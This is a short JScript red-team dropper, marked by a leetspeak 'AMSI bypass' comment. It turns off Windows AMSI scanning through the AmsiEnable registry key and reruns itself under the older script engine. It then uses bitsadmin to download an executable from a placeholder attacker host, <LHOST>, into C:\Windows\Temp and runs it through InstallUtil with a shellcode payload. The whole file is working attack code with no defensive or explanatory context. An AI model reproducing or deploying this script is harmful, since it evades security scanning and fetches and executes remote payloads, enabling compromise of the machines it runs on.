// 4MS7_BYP455
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
try{
    var AmsiEnable = sh.RegRead(key);
    if(AmsiEnable!=0){
    throw new Error(1, '');
    }
}catch(e){
    sh.RegWrite(key, 0, "REG_DWORD");
    sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);
    sh.RegWrite(key, 1, "REG_DWORD");
    WScript.Quit(1);
}

var cmd = "bitsadmin /transfer myjob /download /priority high http://<LHOST>/windows/bin/redteam-yadokari.exe C:\\Windows\\Temp\\redteam-yadokari.exe";
var cmd2 = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Installutil.exe /logfile= /LogToConsole=false /payload=<SHELLCODE64> /U C:\\Windows\\Temp\\redteam-yadokari.exe"
var deploy = sh.Run(cmd);
deploy = sh.Run(cmd2);